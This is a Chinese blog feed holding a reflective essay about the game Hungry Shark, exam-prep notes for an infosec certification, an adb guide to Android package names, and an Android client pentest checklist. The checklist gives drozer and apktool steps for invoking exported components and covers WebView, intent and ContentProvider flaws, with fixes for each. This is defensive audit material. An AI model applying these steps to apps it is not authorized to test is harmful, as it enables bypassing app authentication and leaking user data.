title="契机"></a>契机</h1><p>今年五月份的时候，我请了40天假，回学校处理一些之前堆压的事情，以及忙着毕业设计和答辩，也见了不少老友，那段时间是我自出去全职实习以后最轻松快乐的日子。</p><p>有一次，我去朋友家，她说她最近在玩【神庙逃亡】，反正闲来无事，我也下载了跟她一起玩，这游戏我之前也玩过，我玩的更多的是【地铁跑酷】吧。没玩几把，我就觉得无聊极了，在这个游戏上没有任何想玩下去的欲望了，于是我就把它给卸载了。卸载之后也还是无聊，就在应用商城里翻啊翻，希望能找到一款我能玩下去的游戏，【饥饿鲨：进化】映入眼帘。</p><p>我不是第一次玩饥饿鲨了，在初三刚转学回老家那会儿，就跟着村里的小伙伴们一起玩过这个游戏一段时间了，到现在也有八年的时间了，中途偶尔也下载下来玩过几盘，但少有的是能在我手机里“存活”一个月以上的游戏。</p><p>上面说明那些，又臭又长，目的是告诉你，饥饿鲨在我手机里呆了两个月，真的不容易。最近玩的时候，总感觉，从那条鲨鱼身上领悟到了好多东西。也许你会想了：玩个游戏而已，就是为了放松，没必要这样吧，干什么都要从里面学点东西，累不累啊你？</p><p>我想说的是，这些想法是在玩的过程中不自觉的进入到我的脑子里，并且反反复复多次，我才决定将它记录下来。</p><h1 id="我学到的"><a href="#我学到的" class="headerlink" title="我学到的"></a>我学到的</h1><h1 id="世界的美好来源于你的强大"><a href="#世界的美好来源于你的强大" class="headerlink" title="世界的美好来源于你的强大"></a>世界的美好来源于你的强大</h1><p>去年刚出校实习的我，就像游戏里那条【礁鲨】一样，它是游戏里最差的鲨鱼，一出场就是它。</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20231108133418847.png" alt="image-20231108133418847" style="zoom:50%;" /><p>作为一条礁鲨，除了一些小鱼小虾对你没有伤害之外，其余的都能对你造成伤害。一条比你大的鲨鱼咬你一口，水母蜇你一下，螃蟹夹你一钳，潜水的人打你一枪，小红鱼刺你一下，毒气毒你一阵，连平时能吃的河豚，在它鼓气的时候，都能对你造成伤害。无处不在的水下炸弹，随时都可能要了你的命。游太深了会有水压伤害，有时候遇到水中暗流，凭你的力气，哪怕奋力加速，也根本无法前进，最后只能顺着暗流的方向走。凭你的力气，也完全无法上岸去吃岸上的食物，在缺水的状况下，你的生命会快速终结。</p><p>世界对于你一个礁鲨来说，复杂极了，到处都是危险，一不留意，你就没了。</p><p>你很努力，也很勤奋，一心想上，慢慢的，你越来越强，你成为了大白鲨。</p><p>大白鲨是游戏里的第5条鲨鱼（5&#x2F;18），是正常（非变异）鲨鱼里最强的鲨鱼了。对你来说，海下正常的鱼类，都将是你的猎物。这时候，小炸弹和毒气对你来说伤害也极小了，一些低级的变异鱼类同样也沦为了你的猎物，你害怕的只有大炸弹、超级炸弹、水母、和一些超强的变异鲨鱼了。</p><p>你已经能应付绝大多数你所遇到的情况了，你越来越强大，世界对你来说越来越美好。</p><h1 id="有些梦想终会无疾而终"><a href="#有些梦想终会无疾而终" class="headerlink" title="有些梦想终会无疾而终"></a>有些梦想终会无疾而终</h1><p>初出茅庐的你——一只小礁鲨，对于未知的世界，你满腔热血，看着鲨鱼列表里最强大的“维京鲨”，你说：“<strong>将来我一定要活成他的样子</strong>”。你不知道维京鲨对你来说意味着什么，成为他需要多大的运气和努力，你只知道，它是最强的，你想成为像它一样的鲨鱼。</p><p>然后你努力升级，勤奋下海，一点点攒着金币，买了一个个更厉害的鲨鱼，在海下世界里越来越得心应手。</p><p>升级6次，总共花费了2个月的时间，那将会是你十几二十年的青春吧，你已经不是当初那个礁鲨了，你变成了【霸王】，即使这样，要成为【维京鲨】，前面还有11条鲨鱼，每升级一次，都变得异常困难。</p><p>游戏中尚可投入大量的时间去赚取金币，因为你的生命长度远远超过这款游戏的生命周期；可是一旦类比到现实生活中，你仿佛知道：无论多么拼尽全力，在生命终结时，你都无法成为维京鲨了。</p><p>这是你的宿命。</p><h1 id="不要丢失曾经的自己"><a href="#不要丢失曾经的自己" class="headerlink" title="不要丢失曾经的自己"></a>不要丢失曾经的自己</h1><p>曾经说过要看遍海底世界，走遍每一个角落，收集每一处沉船宝物和海底宝藏。</p><p>而事实上，刚开始的时候，初级鲨鱼因为受不了海底深处的巨大水压，就只能在浅层穿梭；成长过后，又因为体型庞大，难以通过部分狭窄的通道；体力消耗与体型成正比，你变强了，也可以说你变得越来越笨重了，你再也无法去探索那些小众的地方了，因为那些地方的猎物不足以支撑你的体力销号。</p><p>你永远都需要取舍。</p><p>游戏中，你无法做到同时结合二者的优势，但在现实中却是可行的。</p><p>你能自如的应对现实生活中出现的各种状态，内心依然住着一个少年，他们俩将一同带你去见识这美好的世界。</p><p>慢慢的，你看到了一部分的世界，你见过炸弹、鲨鱼、毒气，也亲身经历了，尝到了一些苦头.在这一阶段，你知道了哪些是你能吃的，哪些是能对你造成伤害的。</p><p>作为一条礁鲨，经历过上面的阶段之后，大多数情况下，过不了多久你就能顺利升级成为【灰鲭鲨】。</p><p>灰鲭鲨是游戏里的第二条鲨鱼，战斗力倒数第二，但是比起礁鲨–之前的自己，你又成为了不一样的自己。肉眼可见地发生了变化，你变得更壮实了，体型更大了，能应付更深的水位带来的压力，有更强的生存能力，同时有些原来能伤害你的鱼类，也变成了你的猎物。</p><p><strong>这是你第一次改头换面。</strong></p><p>你尝到了甜头，于是你便更加努力，希望能更上一层楼，早日成为【锤头鲨】。</p><p>日复一日，终于，你做到了，你完成了又一次质的飞跃，这种感觉给你带来了极大的快乐。</p><p>大多数的普通鲨鱼，他们的一生便停留在了这一阶段：能吃些小鱼小虾，不至于把自己饿死，对初出茅庐的礁鲨也能指点江山一番。</p><h2 id="狂傲自大"><a href="#狂傲自大" class="headerlink" title="狂傲自大"></a>狂傲自大</h2><p>由于前期的快速成长，就你之前所看到的、所经历的事务，在你一次又一次的蜕变之后，发现他们好像也没有那么牛，之前遇到的困难，对现在的你来说，不过是小菜一碟。</p><p>你变得目中无人，狂傲又自大，一副“这个世界老子说了算，他们都是狗屁”的样子，你狂傲了一段时间，为自己的成长感到喜悦，和世界炫耀着。</p><p>走路带风，昂首挺胸，一路横冲，老子最疯。</p><p>变化发生在你再次下海之后，你发现这和你原来看到的世界不太一样了。</p><p>原来的小鱼小虾对你来说确实微不足道了，于是你游到海底深处，又见识到了一些从前从未见过的生物，虽然你能吃掉它，但他也能咬死你。游着游着，你又遇到一些之前压根就没见过的生物，但凡被他们咬上一口，你非得半死不活，在他们面前，你不过是个小喽喽罢了。</p><h2 id="成长的烦恼"><a href="#成长的烦恼" class="headerlink" title="成长的烦恼"></a>成长的烦恼</h2><p>你一路成长，原先下一趟海，吃上些虾兵蟹将，拼命的游啊游，找东西吃，躲避更大的鲨鱼，折腾一回，能赚几十到一两百不等。那时候你已经很满足了，一点一点的攒着赚来的金币，用它来换一个更强大的鲨鱼。</p><p>慢慢的，你已经和原来不一样了，随着一次次的升级，你每次下海一躺的钱赚的越来越多，但获得快乐也越来越难，欲望越来越大，要的越来越多。</p><h2 id="眼光要放长远"><a href="#眼光要放长远" class="headerlink" title="眼光要放长远"></a>眼光要放长远</h2><p>我会花金币解锁下一条鲨鱼，但我却从未花金币升级过当前鲨鱼的咬力、速度和加速能力。所有我已经拥有过的鲨鱼，都没有对这些能力进行升级。</p><p>我之前也没有一个固定的说法，也不了解自己做这个决定的底层逻辑是什么，只知道自己主观不想去升级这些能力，想把金币都花在购买下一条鲨鱼上面。</p><p>我在写这篇博客之前，突然想出了我这个决定的底层逻辑：</p><p>我希望 <strong>把有限的资源投入到长远有意义的事情上，而不是图短期的快乐</strong>。</p><p>因为我知道，我花金币升级了这些实力之后，确实能给我带来一些提升，能让我短时间内活的更舒服，但是我花费大量的金币在这个上面，那势必，我离买下一个鲨鱼越来越远。</p><p>加上这些能力只适用于当前鲨鱼，一旦我更换了其他更高级的鲨鱼，我肯定不会再用到之前的鲨鱼，那我就得重新升级当前鲨鱼的能力，只要我还没到天花板，或者离天花板太远了，我在这上面的投入回报比就非常低，我不愿意做这样的事情。</p><p>再一个就是金币有限，如果我玩破解版，大量用不完的金币（现实生活中的富二代们），那我绝对不会去考虑这么点金币的投资回报比。可我玩的是普通版，金币的累计是十分漫长的，我不希望它被随随便便的花在一些没那么需要它的地方。</p>]]></content>
      
      
      <categories>
          
          <category> 总结思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结思考 </tag>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实习总结-半路出家网安人的记录与思考</title>
      <link href="/2023/internship-summary/"/>
      <url>/2023/internship-summary/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="cacba5166747484ba8f57312ae244e53f50fce53fd56a43b0e89350f2abaf6b7"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 总结思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软考-信息安全工程师-备考笔记</title>
      <link href="/2023/information-security-engineer/"/>
      <url>/2023/information-security-engineer/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2023.7.1日</p></blockquote><p>开此篇博客是为了记录自己准备软考的过程，比如：</p><ul><li>软考相关信息收集</li><li>备考笔记</li><li>一些碎碎念（想看我哔哔赖赖的请移步本文【碎碎念】part）</li></ul><p>希望2023年能顺利考下这个证书。</p><h1 id="关于软考-信息安全工程师"><a href="#关于软考-信息安全工程师" class="headerlink" title="关于软考-信息安全工程师"></a>关于软考-信息安全工程师</h1><p>1、什么是软考？<br>软考既是<strong>职业资格考试</strong>，又是<strong>职称资格考试</strong>，同时，还具有水平考试性质，是目前国内最具权威的计算机类考试，含金量最高，涉及面最广。</p><p>2、有哪些岗位<br>参考软考官网 <a href="https://www.ruankao.org.cn/platform">https://www.ruankao.org.cn/platform</a></p><p>3、科目怎么选？</p><ul><li>不建议考初级，软考可以越级考试</li><li>根据工作来选考试科目</li></ul><h2 id="含金量"><a href="#含金量" class="headerlink" title="含金量"></a>含金量</h2><p>1、职称评定。以考代评，通过即为中级职称。<br>2、积分落户。<br>3、抵扣个税。<br>4、升职加薪。<br>5、领取政府现金补贴。技能提升拿证后，即可申请领取补贴。<br>6、企业招投标加分。</p><h2 id="考试形式"><a href="#考试形式" class="headerlink" title="考试形式"></a>考试形式</h2><p>初级和中级都是考两门：</p><ul><li>基础知识（选择题：单选75题）</li><li>应用技术（问答题：4-6题）</li></ul><p>高级考三门：</p><ul><li>综合知识（选择题：单选75题）</li><li>案例分析（问答题：3题）</li><li>论文（2700字左右）</li></ul><h2 id="考试科目"><a href="#考试科目" class="headerlink" title="考试科目"></a>考试科目</h2><p>1、网络信息安全基础知识和技术</p><ul><li>150分钟（上午 9:00-11:30）</li><li>综合知识，75道选择题</li><li>75分</li></ul><p>2、网络信息安全工程与综合应用实践</p><ul><li>150分钟（下午 14:00-16:30）</li><li>案例分析，问答题，一般 4-5 道，每道试题 3-4 个问题</li><li>75分</li></ul><p><strong>官方参考书目：《信息安全工程师教程（第2版）》蒋建春主编</strong></p><h2 id="通过标准"><a href="#通过标准" class="headerlink" title="通过标准"></a>通过标准</h2><p>所有科目合格标准为试卷满分的60%(45分&#x2F;75分)合格<br>需一次性通过所有科目，考试成绩不保留</p><p>成绩查询：一般可于考试后三个月左右，登录<a href="http://www.ruankao.org.cn/">报名网站</a>进行成绩查询</p><h2 id="报名条件"><a href="#报名条件" class="headerlink" title="报名条件"></a>报名条件</h2><p>无</p><h2 id="报名时间"><a href="#报名时间" class="headerlink" title="报名时间"></a>报名时间</h2><p>软考每年有两次考试，分别安排在上半年和下半年。<br>每次考试时间略有不同，上半年考试时间为5月下旬，报名时间一般3月份开始；<br>下半年考试时间为11月上旬，报名时间一般在8月开始。<br>报名网站 <a href="https://bm.ruankao.org.cn/sign/welcome">https://bm.ruankao.org.cn/sign/welcome</a></p><h2 id="备考建议"><a href="#备考建议" class="headerlink" title="备考建议"></a>备考建议</h2><p>1、备考时间：3-5个月<br>通读一遍教材（1个月左右）——熟读教材和讲义——综合知识练习——案例分析题真题——论文写作（考前2个月）——考前冲刺。</p><p>2、需要完成的任务</p><ul><li>综合知识题库（知识点全覆盖）</li><li>历年真题练习（2016年-至今）</li><li>讲义（重点内容必看）</li><li>视频（仔细听讲+回看）</li></ul><p>3、一定要多看教材，多做题。考试会有很多概念题，还有一些分析题，这些要想全部做好，你的基础就得打牢。</p><p>4、上午题75道选择题，考试范围很广，下午题虽然是文字题，但其实每次就考那几个知识点，反而不用太担心。</p><p>5、最后冲刺阶段做几套模拟题，保证正确率在80%，基本上差不多了。</p><h2 id="证书查询"><a href="#证书查询" class="headerlink" title="证书查询"></a>证书查询</h2><p><a href="https://query.ruankao.org.cn/">https://query.ruankao.org.cn</a></p><p><a href="http://www.cpta.com.cn/certQuery.html">http://www.cpta.com.cn/certQuery.html</a></p><h1 id="备考笔记"><a href="#备考笔记" class="headerlink" title="备考笔记"></a>备考笔记</h1><h2 id="一轮：章节归纳"><a href="#一轮：章节归纳" class="headerlink" title="一轮：章节归纳"></a>一轮：章节归纳</h2><ul><li><a href="https://jenchoi.top/2023/chapter1-information-security-overview">第1章：网络信息安全概述</a></li><li><a href="https://jenchoi.top/2023/chapter2-attack-priciples-and-methods">第2章：网络攻击原理与常用方法</a></li><li></li></ul><h2 id="二轮：知识精炼"><a href="#二轮：知识精炼" class="headerlink" title="二轮：知识精炼"></a>二轮：知识精炼</h2><h2 id="三轮：冲刺总结"><a href="#三轮：冲刺总结" class="headerlink" title="三轮：冲刺总结"></a>三轮：冲刺总结</h2><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><h2 id="为什么参加软考"><a href="#为什么参加软考" class="headerlink" title="为什么参加软考"></a>为什么参加软考</h2><p>1、应届生，安全行业没啥可考的证书，NISP太过于蹩脚，CISP还不够格，其他的细分领域还有待进一步确认，软考总体上是一个不错的选择，费用低，国家性考试，含金量尚可。</p><p>2、目前时间比较充裕，与其天天追剧，不如做点对未来有益的事情。</p><p>3、听国企、体制内的一些前辈提到这个考试，说有利于评职称，虽然不知道以后会不会进国企什么的，但考下来总归是有利无害的。</p><p>4、顺便借着此次考试，看看考试和实际工作的重点有何不一样。</p><p>5、开开眼，多了解下领域内的知识。</p><p>6、一直想多考点证书，各种各样的证书，以证促学。</p><h2 id="怎么安排自己的备考计划"><a href="#怎么安排自己的备考计划" class="headerlink" title="怎么安排自己的备考计划"></a>怎么安排自己的备考计划</h2><p>我是5月份回学校忙毕业事宜的时候，决定考这个证书。查了些资料，确定了今年下午会有一场信安的考试，于是决定备考，整起来。</p><p>6月12号返岗，陆陆续续学了两章，然后忙毕业转正的事情，中途又去黄山玩了一趟，耽搁了一两周。</p><p>今天是7月1号，对于备考的计划是：</p><ul><li>7月-8月上旬：完成一轮，把知识点快速的过一遍。（本月可能比较忙，刚到新项目上，要学的比较多，加之中途有10节游泳课，所以拖到8月上旬完成）</li><li>8月-9月：练习题+二轮</li><li>10月-11月考试：做题冲刺。</li></ul><p>不安排具体的，弹性完成，总感觉这项考试不需要我备考4个多月，中间估计会做挺多其他的事。</p><h2 id="第一套真题"><a href="#第一套真题" class="headerlink" title="第一套真题"></a>第一套真题</h2><blockquote><p> 2023.7.2</p></blockquote><p>第三章都没学完，看那些概念实在头疼，于是打算从真题、练习题入手，看看考试在考什么内容，好有针对性的看看。于是把21年的真题扒出来做了下</p><p>特离谱，居然还有英文题。。。我一度怀疑网站是不是传错题目了</p><p>而且他不是简单的考你有没有看懂文章的意思，它涉及到了语法啊。</p><p>就比如说第一空肯定是authentic这个词，但是选项里有他的名词和动名词形式。</p><p>第二个也是，计算机做大量运算，哎。。。我也不知道填哪个。。。</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230702132644996.png" alt="image-20230702132644996"></p><p>更离谱的是，5错3。最终在学了3章不到的情况下，连蒙带猜打了34分</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230702132913141.png" alt="image-20230702132913141"></p><p>这一套题下来的感觉就是，我正确的题目大多是实际用到的、非概念性的。但是在一些法律法规、定义概念上，我就显得吃力，里面涉及到很多需要记忆的点，也不需要背下来，但是得熟悉，看到选项能选出来。</p>]]></content>
      
      
      <categories>
          
          <category> 自我提升 </category>
          
          <category> 考证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取安卓APP包名的方法</title>
      <link href="/2023/how-to-obtain-app-package-name/"/>
      <url>/2023/how-to-obtain-app-package-name/</url>
      
        <content type="html"><![CDATA[<h1 id="有apk包"><a href="#有apk包" class="headerlink" title="有apk包"></a>有apk包</h1><p><strong>手机查看方法：</strong></p><p>那肯定是用万能的MT管理器，哈哈哈哈哈</p><p>找到对应的apk包，点击查看，打开AndroidManifest文件（反编译），搜索 <code>package=</code>，后面的就是包名</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230701235959798.png" alt="image-20230701235959798" style="zoom:67%;" /><p><strong>电脑获取方法：</strong></p><p>和手机步骤一样，只不过要用APKTool来反编译</p><p>apkTool反编译，查看AndroidManifest文件，搜索 <code>package=</code>，后面的就是包名</p><h1 id="已安装，无apk包"><a href="#已安装，无apk包" class="headerlink" title="已安装，无apk包"></a>已安装，无apk包</h1><h2 id="无root"><a href="#无root" class="headerlink" title="无root"></a>无root</h2><p><strong>方法一：</strong></p><p>列出手机内所有apk对应的包名，一个个看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm list package</span><br></pre></td></tr></table></figure><p><strong>方法二：</strong></p><p> 需要先打开应用，再执行命令（不推荐，输出一大堆，看的眼花缭乱）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有包名</span></span><br><span class="line">adb shell dumpsys activity</span><br></pre></td></tr></table></figure><h2 id="已root"><a href="#已root" class="headerlink" title="已root"></a>已root</h2><p>&#x2F;data&#x2F;data 目录下有所有的安装包名</p><p>可以用adb切到该目录之后ls，也可以用MT管理器查看</p><p>推荐MT管理器查看，因为它会带一个应用的icon，adb比较难找</p><p><strong>参考文章</strong></p><p>1、<a href="https://www.jianshu.com/p/f6e8a03db025">获取APK包名的几种方法 - 简书</a></p><p>2、<a href="https://segmentfault.com/a/1190000040947631">爬虫 - 安卓逆向 05 app包名的获取 - 个人文章 - SegmentFault 思否</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓APP客户端渗透测试指南</title>
      <link href="/2023/android-app-client-pentest-guide/"/>
      <url>/2023/android-app-client-pentest-guide/</url>
      
        <content type="html"><![CDATA[<p>安卓APP的渗透测试，主要分为两个方面</p><ul><li><p><strong>客户端</strong>：安卓四大组件的安全性检测，简单来说就是一个个的检查项，看看是否符合要求</p></li><li><p><strong>服务端</strong>：APP和服务端交互的渗透测试，抓包检测，和Web渗透差不多</p></li></ul><p>本篇我们主要介绍Android客户端的渗透测试，重点放在：<strong>要测哪些项目，怎么测</strong>上面。我会一条条的列出相应的测试项，并给出在我认知内最简便的方法（如果大佬们有更好的方法，欢迎邮件与我讨论），供自己及其他同行参考。</p><h1 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h1><ul><li>dex2jar</li><li>APKTool</li><li>jd-gui：<a href="https://github.com/java-decompiler/jd-gui/releases">Releases · java-decompiler&#x2F;jd-gui</a></li></ul><h1 id="应用配置安全"><a href="#应用配置安全" class="headerlink" title="应用配置安全"></a>应用配置安全</h1><h2 id="开启AllowBackup属性"><a href="#开启AllowBackup属性" class="headerlink" title="开启AllowBackup属性"></a>开启AllowBackup属性</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>被测应用的AndroidManifest.xml文件中allowBackup属性值被设置为true，可通过adb backup对应用数据进行备份，在无root的情况下可以导出应用中存储的所有数据，造成用户数据泄露。</p><p><strong>检查工具：</strong>APKTool</p><p><strong>检查方法：</strong></p><p>1、使用APKTool对apk进行反编译（<strong>后续不再详述此步骤</strong>）</p><p>把要反编译的apk复制到APKTool目录下，cmd切到APKTool的目录</p><p>输入指令：<code>apktool.jar d test.apk</code></p><p>完成后，APKTool的目录下会多出一个和apk同名的文件夹</p><p>2、AndroidManifest.xml 文件中查看 allowBackup 属性，检查是否未设置或者被设置为true</p><blockquote><p>AndroidManifest.xml 文件在刚刚反编译出来的文件夹里</p></blockquote><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230701135230263.png" alt="image-20230701135230263"></p><p><strong>整改意见：</strong>将参数android:allowBackup属性设置为false，防止数据泄漏</p><h2 id="开启Debuggable属性"><a href="#开启Debuggable属性" class="headerlink" title="开启Debuggable属性"></a>开启Debuggable属性</h2><p><strong>漏洞等级：中</strong></p><p><strong>风险分析：</strong>被测应用的AndroidManifest.xml文件中Debuggable属性值被设置为true时，可以设置断点来控制程序的执行流程，在应用程序运行时修改其行为，app存在被恶意程序调试的风险，可能导致泄漏敏感信息泄漏等问题。</p><p><strong>检查工具：</strong>APKTool</p><p><strong>检查方法：</strong></p><p>1、使用APKTool对apk进行反编译</p><p>2、AndroidManifest.xml 文件中查看 Debuggable 属性，检查是否未设置或者被设置为true</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230701135254393.png" alt="image-20230701135254393"></p><p><strong>整改意见：</strong>将参数android:allowBackup属性设置为false，防止数据泄漏</p><h1 id="公共组件安全"><a href="#公共组件安全" class="headerlink" title="公共组件安全"></a>公共组件安全</h1><h2 id="WebView组件远程代码执行"><a href="#WebView组件远程代码执行" class="headerlink" title="WebView组件远程代码执行"></a>WebView组件远程代码执行</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>Android API level 16以及之前的版本存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface 方法，远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法，导致远程代码执行漏洞。</p><p><strong>检查工具：</strong>dex2jar、jd-gui</p><p><strong>检查方法：</strong></p><p>1、解压缩apk文件（apk和zip包一样，可以直接被解压缩。改成zip后缀再解压缩也是一样的），得到其中的classes.dex</p><p>2、把classed.dex复制到 dex2jar 的目录下，cmd运行 <code>dex2jar.bat classes.dex </code>，得到 classes_dex2jar.jar</p><p>3、使用 jd-gui 打开 classes_dex2jar.jar</p><p>4、全局搜索是否使用 addJavascriptInterface 方法</p><p>5、如果是 Android 4.2 之前版本，查看源代码中是否对addJavascriptInterface的输入参数进行过滤；如果是Android 4.2及之后版本，检查是否声明@JavascriptInterface来代替addjavascriptInterface</p><p><strong>整改意见：</strong></p><p>1、不使用 addJavascriptInterface 方法</p><p>2、若必须使用，则应对访问的url进行过滤限制或对html页面进行完整性校验，同时显示移除对指定的javascript接口的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(searchBoxJavaBridge_);</span><br><span class="line">removeJavascriptInterface(accessibility);</span><br><span class="line">removeJavascriptInterface(accessibilityTraversal);</span><br></pre></td></tr></table></figure><p>3、采用@JavascriptInterface 代替 addjavascriptInterface</p><h2 id="Activity组件配置错误"><a href="#Activity组件配置错误" class="headerlink" title="Activity组件配置错误"></a>Activity组件配置错误</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>Activity是安卓应用组件，提供与用户进行交互的界面，如果应用对权限控制不当，攻击者可以绕过认证阶段，直接调用后续activity组件。</p><p><strong>检查工具：</strong>drozer</p><p><strong>检查方法：</strong></p><p>1、进入drozer（教程 <a href="https://jenchoi.top/2023/install-drozer-on-windows/">https://jenchoi.top/2023/install-drozer-on-windows/</a> ）</p><p>2、获取被测应用的包名（教程：<a href="https://jenchoi.top/2023/how-to-obtain-app-package-name">获取APP包名的方法</a>）</p><p>3、运行 <code>run app.activity.info –a  包名</code></p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230701150922596.png" alt="image-20230701150922596" style="zoom:45%;" /><p>4、直接调用对应组件，看看是否能绕过app本身逻辑直接请求组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component 包名 组件名</span><br></pre></td></tr></table></figure><blockquote><p>组件名就是上面com.xxx.xxx.xxx.xxxActivity</p></blockquote><p><strong>整改意见：</strong></p><p>1、如果组件不需要与其他app共享数据或交互，请将该组件的exported的属性为“false”。如果组件需要与其他app共享数据或交互， 请对组件进行权限控制和参数校验。app内使用的私有Activity不应配置intent-filter，如果配置了intent-filter需设置exported属性为false</p><p>2、谨慎处理接收的intent以及其携带的信息，当Activity返回数据时候需注意目标Activity是否有泄露信息的风险</p><h2 id="Service组件暴漏"><a href="#Service组件暴漏" class="headerlink" title="Service组件暴漏"></a>Service组件暴漏</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>Service是Android中四大组件进行后台作业的主要组件，如果被测应用对权限控制不当，导致其他应用可以启动被测应用的Service。</p><p><strong>检查工具：</strong>drozer</p><p><strong>检查方法：</strong></p><p>方法一：drozer 执行 <code>run app.service.info -a &lt;packageName&gt;</code></p><p>方法二：直接检查AndroidManifest.xml 文件中的Services是否暴露</p><p><strong>整改意见：</strong></p><p>1、设置Service的android:exported 属性为 false</p><p>2、通过设置自定义权限来限制对Service的访问</p><h2 id="本地拒绝服务漏洞"><a href="#本地拒绝服务漏洞" class="headerlink" title="本地拒绝服务漏洞"></a>本地拒绝服务漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>android系统提供了activity、service和broadcastreceiver等组件，并提供了intent机制来协助应用间的交互与通讯，intent负责对应用中一次操作的动作动作涉及数据、附加数据进行描述，android系统则根据此intent的描述，负责找到对应的组件，将intent传递给调用的组件，并完成组件的调用。android应用本地拒绝服务漏洞源于程序没有对intent.getxxxextra0获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来达到使该应用crash的目的，简单的说就是攻击者通过intent发送空数据、异常或畸形数据给受害者应用导致其崩溃。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、将不必要的组件设置为不导出，即在 AndroidMenifest.xml 中将相应组件的android:exported属性设为false</p><p>2、建议处理通过 intent.getxxxextra() 获取的数据时进行以下判断，以及用try catch方式进行捕获所有异常，以防止应用出现拒绝服务漏洞</p><pre><code> 1) 空指针异常 2) 类型转换异常 3) 数组越界访问异常 4) 类未定义异常 5) 其他异常</code></pre><h2 id="Broadcast组件拒绝服务"><a href="#Broadcast组件拒绝服务" class="headerlink" title="Broadcast组件拒绝服务"></a>Broadcast组件拒绝服务</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>如果用户输入合并到可动态执行的代码中，那么攻击者可以提交构造的输入，破坏原有的数据，指定服务器执行构造的命令</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、AndroidManifest.xml 文件的各 Receiver 标签中，设置android:exported&#x3D;”false”</p><p>2、Receiver 代码中增加消息异常处理机制。</p><h2 id="ContentProvider组件信息泄露"><a href="#ContentProvider组件信息泄露" class="headerlink" title="ContentProvider组件信息泄露"></a>ContentProvider组件信息泄露</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者可以利用开放的Content Provider 获取系统敏感资源</p><p><strong>检查工具：</strong>drozer</p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、AndroidManifest.xml文件的各Provider标签中，设置android;exported&#x3D;”false”</p><p>2、内部app通过ContentProvider交换数据，设置 protectionLevel&#x3D; “signature” 来验证签名</p><p>3、公开的 ContentProvider 确保不存储敏感数据</p><h2 id="ContentProvider组件SQL注入"><a href="#ContentProvider组件SQL注入" class="headerlink" title="ContentProvider组件SQL注入"></a>ContentProvider组件SQL注入</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>暴露的Provider组件，如果在 query() 中使用<strong>拼接</strong>字符串组成sql语句的形式去查询数据库，容易发生sql注入攻击。</p><p><strong>检查工具：</strong>无</p><p><strong>检查方法：</strong></p><p>1、AndroidManifest.xml 中查找Provider是否对外暴露（exported属性为true）</p><p>2、是否使用 query() 方法</p><p>3、SQL语句赋值来源是否为拼接字符串</p><p><strong>整改意见：</strong></p><p>1、不必要导出的Provider组件，建议显示设置组件的 android:exported 属性为 false</p><p>2、使用selectionArgs进行参数化查询</p><h2 id="content-provider目录遍历检测"><a href="#content-provider目录遍历检测" class="headerlink" title="content provider目录遍历检测"></a>content 